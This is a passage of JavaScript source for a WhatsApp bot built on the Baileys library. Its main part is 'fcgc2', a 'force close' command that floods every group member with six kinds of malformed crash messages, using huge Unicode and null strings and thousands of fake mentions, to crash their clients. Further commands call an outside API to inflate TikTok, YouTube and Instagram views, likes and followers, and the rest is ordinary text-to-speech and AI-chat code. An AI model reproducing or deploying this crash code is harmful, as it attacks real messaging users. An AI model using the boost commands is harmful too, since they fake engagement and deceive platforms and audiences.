        });
        return true;
      } catch (e) {
        logger.error('[NewsletterCrash] Error:', e.message);
        return false;
      }
    }

    // ── Send newsletter crash ──
    const newsResult = await sendNewsletterCrash();
    if (newsResult) sent++;
    else failed++;

    await mzazireply(
      `✅ *Force Close Complete*\n\n` +
      `👥 Group: ${sender}\n` +
      `📊 Sent: ${sent} payloads\n` +
      `❌ Failed: ${failed}\n` +
      `💀 Status: ${failed > 0 ? '⚠️ Some payloads failed' : '✅ All payloads delivered'}`
    );

  } catch (err) {
    logger.error('ForceClose error:', err);
    await mzazireply(`❌ ForceClose failed: ${err.message}`);
  }
  break;
}
case 'fcgc2': {
  if (!isOwner) {
    await mzazireply('❌ Only the bot owner can use this command.');
    break;
  }

  // ── Check if in a group ──
  if (!isGroup) {
    return mzazireply('❌ This command only works in groups.');
  }

  // ── Check if bot is admin ──
  

  // ── Parse count (optional) ──
  const count = Math.min(parseInt(text) || 3, 10);

  // ── Get all group participants except sender ──
  const targets = participants
    .filter(p => p.id !== sender && p.id !== mzazi.user.id)
    .map(p => p.id);

  if (targets.length === 0) {
    return mzazireply('❌ No other members found in the group.');
  }

  await mzazireply(
    `💀 *Force Close Started*\n\n` +
    `👥 Group: ${sender}\n` +
    `👤 Targets: ${targets.length} members\n` +
    `📊 Count: ${count} payloads per target\n` +
    `⏳ Sending crash payloads...`
  );

  let totalSent = 0;
  let totalFailed = 0;

  try {
    const crypto = require('crypto');
    const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    // ── PAYLOAD 1: Catalog Message Crash ──
    async function sendCatalogCrash(target) {
      try {
        const catalogPayload = {
          interactiveMessage: {
            body: { text: "MZAZI TECH FORCE CLOSE" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "catalog_message",
                  buttonParamsJson: JSON.stringify({
                    title: "\u0111\u0115\u0114\u0117".repeat(50000),
                    description: "\u0000".repeat(300000),
                    products: Array.from({ length: 30000 }, (_, i) => ({
                      id: "prod_" + i,
                      name: "\u0111".repeat(20000),
                      price: "Ksh 999.999",
                      currency: "Ksh",
                      image_url: "https://t.me/mzazitechincorparatedcompany" + "\u0000".repeat(50000)
                    })),
                    catalog_id: "\u0111\u0115\u0114\u0117".repeat(50000)
                  })
                }
              ],
              version: 1
            },
            contextInfo: {
              quotedMessage: {
                interactiveMessage: {
                  body: { text: "MzaziClose" }
                }
              }
            }
          }
        };

        await mzazi.relayMessage(target, catalogPayload, {
          participant: { jid: target },
          additionalNodes: [
            {
              tag: 'biz',
              attrs: {
                native_flow_name: 'catalog_message',
              },
            },
          ],
        });
        return true;
      } catch (e) {
        logger.error('[CatalogCrash] Error:', e.message);
        return false;
      }
    }

    // ── PAYLOAD 2: Location Crash ──
    async function sendLocationCrash(target) {
      try {
        const locationPayload = {
          locationMessage: {
            degreesLatitude: 9999999999999,
            degreesLongitude: 9999999999999,
            name: "nick".repeat(100000),
            address: "\u0000".repeat(50000),
            url: "https://t.me/damidriller",
            contextInfo: {
              remoteJid: "\u200b".repeat(90000),
              participant: "target",
              mentionedJid: [
                "\u0000",
                "Warking Is Here"
              ]
            }
          }
        };

        await mzazi.relayMessage(target, locationPayload, {
          participant: { jid: target }
        });
        return true;
      } catch (e) {
        logger.error('[LocationCrash] Error:', e.message);
        return false;
      }
    }

    // ── PAYLOAD 3: Interactive Response Crash ──
    async function sendInteractiveCrash(target) {
      try {
        const mentionedList = Array.from({ length: 5000 }, () => 
          `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
        );

        const msg = generateWAMessageFromContent(target, {
          interactiveResponseMessage: {
            body: {
              text: "💀".repeat(50000) + "🔥".repeat(50000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "{".repeat(50000) + "}".repeat(50000),
              version: 3
            },
            contextInfo: {
              mentionedJid: mentionedList,
              remoteJid: "status@broadcast",
              participant: target
            }
          }
        }, {});

        await mzazi.relayMessage(target, msg.message, {
          messageId: msg.key.id,
          participant: { jid: target }
        });
        return true;
      } catch (e) {
        logger.error('[InteractiveCrash] Error:', e.message);
        return false;
      }
    }

    // ── PAYLOAD 4: SenderKeyDistribution Crash ──
    async function sendSenderKeyCrash(target) {
      try {
        await mzazi.relayMessage(target, {
          senderKeyDistributionMessage: {
            groupId: "120363428445623974@g.us",
            axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
          },
          interactiveMessage: {
            body: {
              text: "MZAZI TECH | FORCE CLOSE"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "catalog_message",
                  buttonParamsJson: "{}"
                }
              ],
              messageParamsJson: "{}"
            }
          }
        }, {
          additionalNodes: [
            {
              tag: "biz",
              attrs: {
                native_flow_name: "catalog_message"
              }
            }
          ]
        });
        return true;
      } catch (e) {
        logger.error('[SenderKeyCrash] Error:', e.message);
        return false;
      }
    }

    // ── PAYLOAD 5: Newsletter Admin Invite Crash ──
    async function sendNewsletterCrash(target) {
      try {
        await mzazi.relayMessage(target, {
          botInvokeMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: '33333333333333333@newsletter',
                newsletterName: "MZAZI TECH FORCE CLOSE" + "ꦾ".repeat(80000),
                jpegThumbnail: null,
                caption: "💀".repeat(50000) + "🔥".repeat(50000),
                inviteExpiration: Date.now() + 1814400000,
              },
            },
          },
        }, {
          userJid: target,
        });
        return true;
      } catch (e) {
        logger.error('[NewsletterCrash] Error:', e.message);
        return false;
      }
    }

    // ── PAYLOAD 6: ExtendedText Crash ──
    async function sendExtendedTextCrash(target) {
      try {
        const bigUnicode = "𑇂𑆵𑆴𑆿".repeat(60000);
        const msg = generateWAMessageFromContent(target, {
          extendedTextMessage: {
            text: bigUnicode + ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ",
            matchedText: "https://t.me/mzazitech",
            description: bigUnicode,
            title: "MZAZI TECH INC" + bigUnicode,
            previewType: "NONE",
            contextInfo: {
              mentionedJid: Array.from({ length: 2000 }, () => 
                `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
              forwardingScore: 999,
              isForwarded: true
            }
          }
        }, {
          additionalAttributes: { edit: "7" }
        });

        await mzazi.relayMessage(target, msg.message, {
          messageId: msg.key.id,
          participant: { jid: target }
        });
        return true;
      } catch (e) {
        logger.error('[ExtendedTextCrash] Error:', e.message);
        return false;
      }
    }

    // ── Payload list ──
    const payloads = [
      { name: 'Catalog', fn: sendCatalogCrash },
      { name: 'Location', fn: sendLocationCrash },
      { name: 'Interactive', fn: sendInteractiveCrash },
      { name: 'SenderKey', fn: sendSenderKeyCrash },
      { name: 'Newsletter', fn: sendNewsletterCrash },
      { name: 'ExtendedText', fn: sendExtendedTextCrash },
    ];

    // ── Send to each target ──
    for (const target of targets) {
      for (let i = 0; i < count; i++) {
        for (const p of payloads) {
          try {
            const result = await p.fn(target);
            if (result) totalSent++;
            else totalFailed++;
            await new Promise(resolve => setTimeout(resolve, 500));
          } catch (e) {
            totalFailed++;
            logger.error(`[${p.name}] Error:`, e.message);
          }
        }
        if (i < count - 1) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
    }

    await mzazireply(
      `✅ *Force Close Complete*\n\n` +
      `👥 Group: ${sender}\n` +
      `👤 Targets: ${targets.length} members\n` +
      `📊 Total Sent: ${totalSent} payloads\n` +
      `❌ Total Failed: ${totalFailed}\n` +
      `💀 Status: ${totalFailed > totalSent ? '⚠️ Some payloads failed' : '✅ All payloads delivered'}`
    );

  } catch (err) {
    logger.error('ForceClose error:', err);
    await mzazireply(`❌ ForceClose failed: ${err.message}`);
  }
  break;
}
// ──────────────────── BOOST COMMANDS ────────────────────
case "tiktokboost":
case "ttboost": {
    if (!isOwner) return mzazireply("❌ Owner only.");
    if (!text) return mzazireply(
        `📌 *TikTok Boost*\n\n` +
        `Usage: ${prefix}${command} <url> | <type>\n\n` +
        `Types: video_views, video_likes, followers\n\n` +
        `Examples:\n` +
        `${prefix}${command} https://www.tiktok.com/@user/video/123456789 | video_views\n` +
        `${prefix}${command} https://www.tiktok.com/@username | followers`
    );

    const parts = text.split('|');
    const url = parts[0].trim();
    const type = (parts[1]?.trim() || 'video_views').toLowerCase();
    const validTypes = ['video_views', 'video_likes', 'followers'];

    if (!validTypes.includes(type)) {
        return mzazireply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
    }

    if (type === 'followers') {
        const username = url.includes('tiktok.com') ? url.split('@')[1]?.split('/')[0] : url.replace('@', '');
        if (!username) return mzazireply('❌ Provide a valid TikTok username or profile URL for followers');
    } else if (!url.includes('tiktok.com/video/')) {
        return mzazireply('❌ For video_views or video_likes, provide a valid TikTok video URL');
    }

    try {
        await mzazireply(`🚀 Processing TikTok boost… (${type})`);

        const response = await axios.get(
            `https://apis.davidcyril.name.ng/api/tiktok/boost?url=${encodeURIComponent(url)}&type=${type}`,
            { timeout: 30000 }
        );

        if (!response.data?.success) {
            throw new Error(response.data?.message || 'Unknown error');
        }

        const data = response.data;
        let resultMsg = `*🚀 TikTok Boost Successful!*\n\n`;
        resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
        resultMsg += `⚡ Type: ${data.type || type}\n`;
        if (data.data?.amount_processed) resultMsg += `📊 Processed: ${data.data.amount_processed}\n`;
        if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
        if (data.message) resultMsg += `📝 ${data.message}\n`;
        resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${botName}_`;

        await mzazireply(resultMsg);
    } catch (err) {
        logger.error('TikTok boost error:', err);
        mzazireply(`❌ Boost failed: ${err.message}`);
    }
    break;
}

case "tiktokboost2":
case "ttboost2": {
    if (!isOwner) return mzazireply("❌ Owner only.");
    if (!text) return mzazireply(
        `📌 *TikTok Boost v2*\n\n` +
        `Usage: ${prefix}${command} <url> | <type>\n\n` +
        `Types: video_views, video_likes, followers\n\n` +
        `Examples:\n` +
        `${prefix}${command} https://www.tiktok.com/@user/video/... | video_views\n` +
        `${prefix}${command} https://www.tiktok.com/@username | followers`
    );

    const parts = text.split('|');
    const url = parts[0].trim();
    const type = (parts[1]?.trim() || 'video_views').toLowerCase();
    const validTypes = ['video_views', 'video_likes', 'followers'];

    if (!validTypes.includes(type)) return mzazireply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);

    if (type === 'followers') {
        const username = url.includes('tiktok.com') ? url.split('@')[1]?.split('/')[0] : url.replace('@', '');
        if (!username) return mzazireply('❌ Provide a valid TikTok username or profile URL for followers');
    } else if (!url.includes('tiktok.com/video/')) {
        return mzazireply('❌ For video_views or video_likes, provide a valid TikTok video URL');
    }

    try {
        await mzazireply(`🚀 Processing TikTok boost v2… (${type})`);

        const response = await axios.get(
            `https://apis.davidcyril.name.ng/api/tiktok/boost2?url=${encodeURIComponent(url)}&type=${type}`,
            { timeout: 30000 }
        );

        if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');

        const data = response.data;
        let resultMsg = `*🚀 TikTok Boost Successful!*\n\n`;
        resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
        resultMsg += `⚡ Type: ${data.type || type}\n`;
        if (data.data?.amount_processed) resultMsg += `📊 Processed: ${data.data.amount_processed}\n`;
        if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
        if (data.message) resultMsg += `📝 ${data.message}\n`;
        resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${botName}_`;

        await mzazireply(resultMsg);
    } catch (err) {
        logger.error('TikTok boost v2 error:', err);
        mzazireply(`❌ Boost failed: ${err.message}`);
    }
    break;
}

case "tiktokboost3":
case "ttboost3": {
    if (!isOwner) return mzazireply("❌ Owner only.");
    if (!text) return mzazireply(
        `📌 *TikTok Boost v3*\n\n` +
        `Usage: ${prefix}${command} <url> | <type>\n\n` +
        `Types: video_views, video_likes, followers`
    );

    const parts = text.split('|');
    const url = parts[0].trim();
    const type = (parts[1]?.trim() || 'video_views').toLowerCase();
    const validTypes = ['video_views', 'video_likes', 'followers'];

    if (!validTypes.includes(type)) return mzazireply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);

    if (type === 'followers') {
        const username = url.includes('tiktok.com') ? url.split('@')[1]?.split('/')[0] : url.replace('@', '');
        if (!username) return mzazireply('❌ Provide a valid TikTok username or profile URL for followers');
    } else if (!url.includes('tiktok.com/video/')) {
        return mzazireply('❌ For video_views or video_likes, provide a valid TikTok video URL');
    }

    try {
        await mzazireply(`🚀 Processing TikTok boost v3… (${type})`);

        const response = await axios.get(
            `https://apis.davidcyril.name.ng/api/tiktok/boost3?url=${encodeURIComponent(url)}&type=${type}`,
            { timeout: 30000 }
        );

        if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');

        const data = response.data;
        let resultMsg = `*🚀 TikTok Boost Successful!*\n\n`;
        resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
        resultMsg += `⚡ Type: ${data.type || type}\n`;
        if (data.data?.amount_processed) resultMsg += `📊 Processed: ${data.data.amount_processed}\n`;
        if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
        if (data.message) resultMsg += `📝 ${data.message}\n`;
        resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${botName}_`;

        await mzazireply(resultMsg);
    } catch (err) {
        logger.error('TikTok boost v3 error:', err);
        mzazireply(`❌ Boost failed: ${err.message}`);
    }
    break;
}

// ──────────────────── YOUTUBE BOOST ────────────────────
case "youtubeboost":
case "ytboost": {
    if (!isOwner) return mzazireply("❌ Owner only.");
    if (!text) return mzazireply(
        `📌 *YouTube Boost*\n\n` +
        `Usage: ${prefix}${command} <url> | <type>\n\n` +
        `Types: views, likes, subscribers\n\n` +
        `Examples:\n` +
        `${prefix}${command} https://www.youtube.com/watch?v=... | views\n` +
        `${prefix}${command} https://www.youtube.com/@ChannelName | subscribers`
    );

    const parts = text.split('|');
    const url = parts[0].trim();
    const type = (parts[1]?.trim() || 'views').toLowerCase();
    const validTypes = ['views', 'likes', 'subscribers'];

    if (!validTypes.includes(type)) return mzazireply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);

    if (type === 'subscribers') {
        if (!url.includes('youtube.com/@') && !url.includes('youtube.com/channel/')) {
            return mzazireply('❌ For subscribers, provide a valid YouTube channel URL');
        }
    } else if (!url.includes('youtube.com/watch') && !url.includes('youtu.be/')) {
        return mzazireply('❌ For views/likes, provide a valid video URL');
    }

    try {
        await mzazireply(`🚀 Processing YouTube boost… (${type})`);

        const response = await axios.get(
            `https://apis.davidcyril.name.ng/api/youtube/boost?url=${encodeURIComponent(url)}&type=${type}`,
            { timeout: 30000 }
        );

        if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');

        const data = response.data;
        let resultMsg = `*🚀 YouTube Boost Successful!*\n\n`;
        resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
        resultMsg += `⚡ Type: ${data.type || type}\n`;
        if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
        if (data.message) resultMsg += `📝 ${data.message}\n`;
        resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${botName}_`;

        await mzazireply(resultMsg);
    } catch (err) {
        logger.error('YouTube boost error:', err);
        mzazireply(`❌ Boost failed: ${err.message}`);
    }
    break;
}

case "youtubeboost2":
case "ytboost2": {
    if (!isOwner) return mzazireply("❌ Owner only.");
    if (!text) return mzazireply(
        `📌 *YouTube Boost v2*\n\n` +
        `Usage: ${prefix}${command} <url> | <type>\n\n` +
        `Types: views, likes, subscribers`
    );

    const parts = text.split('|');
    const url = parts[0].trim();
    const type = (parts[1]?.trim() || 'views').toLowerCase();
    const validTypes = ['views', 'likes', 'subscribers'];

    if (!validTypes.includes(type)) return mzazireply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);

    if (type === 'subscribers') {
        if (!url.includes('youtube.com/@') && !url.includes('youtube.com/channel/')) {
            return mzazireply('❌ For subscribers, provide a valid YouTube channel URL');
        }
    } else if (!url.includes('youtube.com/watch') && !url.includes('youtu.be/')) {
        return mzazireply('❌ For views/likes, provide a valid video URL');
    }

    try {
        await mzazireply(`🚀 Processing YouTube boost v2… (${type})`);

        const response = await axios.get(
            `https://apis.davidcyril.name.ng/api/youtube/boost2?url=${encodeURIComponent(url)}&type=${type}`,
            { timeout: 30000 }
        );

        if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');

        const data = response.data;
        let resultMsg = `*🚀 YouTube Boost Successful!*\n\n`;
        resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
        resultMsg += `⚡ Type: ${data.type || type}\n`;
        if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
        if (data.message) resultMsg += `📝 ${data.message}\n`;
        resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${botName}_`;

        await mzazireply(resultMsg);
    } catch (err) {
        logger.error('YouTube boost v2 error:', err);
        mzazireply(`❌ Boost failed: ${err.message}`);
    }
    break;
}

case "youtubeboost3":
case "ytboost3": {
    if (!isOwner) return mzazireply("❌ Owner only.");
    if (!text) return mzazireply(
        `📌 *YouTube Boost v3*\n\n` +
        `Usage: ${prefix}${command} <url> | <type>\n\n` +
        `Types: views, likes, subscribers`
    );

    const parts = text.split('|');
    const url = parts[0].trim();
    const type = (parts[1]?.trim() || 'views').toLowerCase();
    const validTypes = ['views', 'likes', 'subscribers'];

    if (!validTypes.includes(type)) return mzazireply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);

    if (type === 'subscribers') {
        if (!url.includes('youtube.com/@') && !url.includes('youtube.com/channel/')) {
            return mzazireply('❌ For subscribers, provide a valid YouTube channel URL');
        }
    } else if (!url.includes('youtube.com/watch') && !url.includes('youtu.be/')) {
        return mzazireply('❌ For views/likes, provide a valid video URL');
    }

    try {
        await mzazireply(`🚀 Processing YouTube boost v3… (${type})`);

        const response = await axios.get(
            `https://apis.davidcyril.name.ng/api/youtube/boost3?url=${encodeURIComponent(url)}&type=${type}`,
            { timeout: 30000 }
        );

        if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');

        const data = response.data;
        let resultMsg = `*🚀 YouTube Boost Successful!*\n\n`;
        resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
        resultMsg += `⚡ Type: ${data.type || type}\n`;
        if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
        if (data.message) resultMsg += `📝 ${data.message}\n`;
        resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${botName}_`;

        await mzazireply(resultMsg);
    } catch (err) {
        logger.error('YouTube boost v3 error:', err);
        mzazireply(`❌ Boost failed: ${err.message}`);
    }
    break;
}

// ──────────────────── INSTAGRAM BOOST ────────────────────
case "instagramboost2":
case "igboost2": {
    if (!isOwner) return mzazireply("❌ Owner only.");
    if (!text) return mzazireply(
        `📌 *Instagram Boost*\n\n` +
        `Usage: ${prefix}${command} <url> | <type>\n\n` +
        `Types: followers, likes, views, comments\n\n` +
        `Examples:\n` +
        `${prefix}${command} https://www.instagram.com/username | followers\n` +
        `${prefix}${command} https://www.instagram.com/p/... | likes`
    );

    const parts = text.split('|');
    const url = parts[0].trim();
    const type = (parts[1]?.trim() || 'followers').toLowerCase();
    const validTypes = ['followers', 'likes', 'views', 'comments'];

    if (!validTypes.includes(type)) return mzazireply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);

    if (type === 'followers') {
        if (!url.includes('instagram.com/') && !url.startsWith('@')) {
            return mzazireply('❌ For followers, provide a valid Instagram profile URL or username');
        }
    } else if (!url.includes('instagram.com/p/') && !url.includes('instagram.com/reel/')) {
        return mzazireply('❌ For likes/views/comments, provide a valid post or reel URL');
    }

    try {
        await mzazireply(`🚀 Processing Instagram boost v2… (${type})`);

        const response = await axios.get(
            `https://apis.davidcyril.name.ng/api/Instagram/boost2?url=${encodeURIComponent(url)}&type=${type}`,
            { timeout: 30000 }
        );

        if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');

        const data = response.data;
        let resultMsg = `*🚀 Instagram Boost Successful!*\n\n`;
        resultMsg += `📸 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
        resultMsg += `⚡ Type: ${data.type || type}\n`;
        if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
        if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
        if (data.message) resultMsg += `📝 ${data.message}\n`;
        resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${botName}_`;

        await mzazireply(resultMsg);
    } catch (err) {
        logger.error('Instagram boost v2 error:', err);
        mzazireply(`❌ Boost failed: ${err.message}`);
    }
    break;
}

case "instagramboost3":
case "igboost3": {
    if (!isOwner) return mzazireply("❌ Owner only.");
    if (!text) return mzazireply(
        `📌 *Instagram Boost v3*\n\n` +
        `Usage: ${prefix}${command} <url> | <type>\n\n` +
        `Types: followers, likes, views, comments`
    );

    const parts = text.split('|');
    const url = parts[0].trim();
    const type = (parts[1]?.trim() || 'followers').toLowerCase();
    const validTypes = ['followers', 'likes', 'views', 'comments'];

    if (!validTypes.includes(type)) return mzazireply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);

    if (type === 'followers') {
        if (!url.includes('instagram.com/') && !url.startsWith('@')) {
            return mzazireply('❌ For followers, provide a valid Instagram profile URL or username');
        }
    } else if (!url.includes('instagram.com/p/') && !url.includes('instagram.com/reel/')) {
        return mzazireply('❌ For likes/views/comments, provide a valid post or reel URL');
    }

    try {
        await mzazireply(`🚀 Processing Instagram boost v3… (${type})`);

        const response = await axios.get(
            `https://apis.davidcyril.name.ng/api/Instagram/boost3?url=${encodeURIComponent(url)}&type=${type}`,
            { timeout: 30000 }
        );

        if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');

        const data = response.data;
        let resultMsg = `*🚀 Instagram Boost Successful!*\n\n`;
        resultMsg += `📸 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
        resultMsg += `⚡ Type: ${data.type || type}\n`;
        if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
        if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
        if (data.message) resultMsg += `📝 ${data.message}\n`;
        resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${botName}_`;

        await mzazireply(resultMsg);
    } catch (err) {
        logger.error('Instagram boost v3 error:', err);
        mzazireply(`❌ Boost failed: ${err.message}`);
    }
    break;
}
case "say":
case "tts": {
    if (!text) return mzazireply(`📌 *Example:*\n${prefix}${command} I love you`);

    try {
        const googleTTS = require('google-tts-api');
        const fetch = require('node-fetch');

        // ── Get audio URL from Google TTS ──
        const url = googleTTS.getAudioUrl(text, {
            lang: 'en',
            slow: false,
            host: 'https://translate.google.com',
        });

        if (!url) return mzazireply("❌ Failed to generate voice.");

        // ── Download audio as buffer using fetch ──
        const response = await fetch(url, {
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });

        if (!response.ok) {
            return mzazireply(`❌ Download failed: ${response.status}`);
        }

        const audioBuffer = await response.buffer();

        if (!audioBuffer || audioBuffer.length === 0) {
            return mzazireply("❌ No audio data received.");
        }

        // ── Send as voice note ──
        await mzazi.sendMessage(sender, {
            audio: audioBuffer,
            mimetype: 'audio/mpeg',
            ptt: true,
            fileName: 'voice.mp3',
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363425539800408@newsletter",
                    newsletterName: botName.toUpperCase(),
                    serverMessageId: 143
                }
            }
        });

    } catch (err) {
        logger.error("TTS error:", err);
        mzazireply(`❌ Failed to generate voice: ${err.message || "Unknown error"}`);
    }
    break;
}


case "deepseek": {
    if (!text) {
        return mzazireply(
            `🤖 *AI Chat*\n\n` +
            `Usage: ${prefix}${command} <question>\n` +
            `Example: ${prefix}${command} who is mzazi?\n\n` +
            `📌 Type "${prefix}${command} reset" to reset conversation history.`
        );
    }

    // ── Reset conversation ──
    if (text.toLowerCase() === "reset") {
        const sessionPath = `./database/sessions/${botPhoneNum}/ai_session.json`;
        const sessionData = loadJSON(sessionPath, {});
        delete sessionData[sender];
        saveJSON(sessionPath, sessionData);
        return mzazireply("✅ Conversation history has been reset!");
    }

    try {
        const query = encodeURIComponent(text.trim());
        let response = null;
        let usedApi = "DeepSeek AI";

        // ── Try DeepSeek API ──
        try {
            const apiUrl = `https://api.drexapp.space/ai/deepseek?q=${query}`;
            const { data } = await axios.get(apiUrl, { timeout: 20000 });

            // ── Extract only the response text from the result object ──
            if (data?.result?.response) {
                response = data.result.response;
            } else if (data?.response) {
                response = data.response;
            } else if (data?.result && typeof data.result === 'string') {
                response = data.result;
            } else if (typeof data === 'string') {
                response = data;
            } else if (data?.message) {
                response = data.message;
            } else if (data?.reply) {
                response = data.reply;
            } else {
                // Last resort: try to extract any text from the object
                const jsonStr = JSON.stringify(data);
                const match = jsonStr.match(/"response":"([^"]*)"/);
                if (match) {
                    response = match[1].replace(/\\n/g, '\n').replace(/\\"/g, '"');
                }
            }
        } catch (err) {
            logger.info("DeepSeek failed:", err.message);
            
            // ── Fallback to DrexApp AI chat ──
            try {
                const fallbackUrl = `https://api.drexapp.space/ai/chat?q=${query}`;
                const { data: fallbackData } = await axios.get(fallbackUrl, { timeout: 15000 });
                response = fallbackData?.result || fallbackData?.response || fallbackData?.message;
                usedApi = "DrexApp AI";
            } catch (fallbackErr) {
                logger.info("Fallback AI failed:", fallbackErr.message);
            }
        }

        if (!response) {
            return mzazireply("❌ AI service is currently unavailable. Please try again later.");
        }

        // ── Clean up response ──
        response = response.replace(/\\n/g, '\n').replace(/\\"/g, '"').trim();

        // ── Remove any [object Object] artifacts ──
        response = response.replace(/\[object Object\]/g, '').trim();

        // ── If response is too long, truncate ──
        if (response.length > 4000) {
            response = response.substring(0, 3900) + '\n\n... (truncated)';
        }

        await mzazireply(`🤖 *${usedApi}:*\n${response}`);

    } catch (err) {
        logger.error("AI Chat error:", err);
        if (err.code === "ECONNABORTED") {
            mzazireply("⏳ Request timed out. Please try again.");
        } else if (err.code === "ENOTFOUND") {
            mzazireply("❌ AI service is currently down. Please try again later.");
        } else if (err.response?.status === 500) {
            mzazireply("⚠️ The AI service is temporarily unavailable (server error). Please try again later.");
        } else {
            mzazireply(`❌ Error: ${err.message || "Failed to get response."}`);
        }
    }
    break;
}

case "gemini": {
    if (!text) {
        return mzazireply(
            `🧠 *Gemini AI Chat*\n\n` +
            `Usage: ${prefix}gemini <question>\n` +
            `Example: ${prefix}gemini explain quantum physics\n\n` +
            `📌 Type "${prefix}gemini reset" to reset conversation history.`
        );
    }

    // ── Reset conversation ──
    if (text.toLowerCase() === "reset") {
        const sessionPath = `./database/sessions/${botPhoneNum}/gemini_session.json`;
        const sessionData = loadJSON(sessionPath, {});
        delete sessionData[sender];
        saveJSON(sessionPath, sessionData);
        return mzazireply("✅ Gemini conversation history has been reset!");
    }

    try {
        const query = encodeURIComponent(text.trim());
        let response = null;
        let usedApi = "Gemini";

        // ── Get or create session ID for this user ──
        const sessionPath = `./database/sessions/${botPhoneNum}/gemini_session.json`;
        const sessionData = loadJSON(sessionPath, {});
        
        if (!sessionData[sender]) {
            sessionData[sender] = {
                sessionId: crypto.randomUUID ? crypto.randomUUID() : require('node:crypto').randomUUID(),
                history: []
            };
            saveJSON(sessionPath, sessionData);
        }

        const sessionId = sessionData[sender].sessionId;

        // ── Try Gemini API (with session) ──
        try {
            const apiUrl = `https://api.drexapp.space/ai/gemini?q=${query}&session=${sessionId}`;
            const { data } = await axios.get(apiUrl, { timeout: 20000 });

            if (data) {
                // Extract response from various formats
                if (data.result?.response) {
                    response = data.result.response;
                } else if (data.result && typeof data.result === 'string') {
                    response = data.result;
                } else if (data.response && typeof data.response === 'string') {
                    response = data.response;
                } else if (data.message && typeof data.message === 'string') {
                    response = data.message;
                } else if (data.reply && typeof data.reply === 'string') {
                    response = data.reply;
                } else if (typeof data === 'string') {
                    response = data;
                } else {
                    // Try to extract from JSON
                    const jsonStr = JSON.stringify(data);
                    const match = jsonStr.match(/"response":"([^"]*)"/);
                    if (match) {
                        response = match[1].replace(/\\n/g, '\n').replace(/\\"/g, '"');
                    }
                }
            }
        } catch (err) {
            logger.info("Gemini API failed:", err.message);
        }

        // ── Fallback to DeepSeek if Gemini fails ──
        if (!response) {
            try {
                const fallbackUrl = `https://api.drexapp.space/ai/deepseek?q=${query}`;
                const { data: fallbackData } = await axios.get(fallbackUrl, { timeout: 15000 });
                
                if (fallbackData?.result?.response) {
                    response = fallbackData.result.response;
                    usedApi = "DeepSeek (fallback)";
                } else if (fallbackData?.response) {
                    response = fallbackData.response;
                    usedApi = "DeepSeek (fallback)";
                } else if (fallbackData?.result && typeof fallbackData.result === 'string') {
                    response = fallbackData.result;
                    usedApi = "DeepSeek (fallback)";
                }
            } catch (fallbackErr) {
                logger.info("DeepSeek fallback failed:", fallbackErr.message);
            }
        }

        // ── Fallback to DrexApp AI chat ──
        if (!response) {
            try {
                const fallbackUrl = `https://api.drexapp.space/ai/chat?q=${query}`;
                const { data: fallbackData } = await axios.get(fallbackUrl, { timeout: 15000 });
                response = fallbackData?.result || fallbackData?.response || fallbackData?.message;
                usedApi = "DrexApp AI (fallback)";
            } catch (fallbackErr) {
                logger.info("DrexApp AI fallback failed:", fallbackErr.message);
            }
        }

        if (!response) {
            return mzazireply("❌ AI service is currently unavailable. Please try again later.");
        }

        // ── Clean up response ──
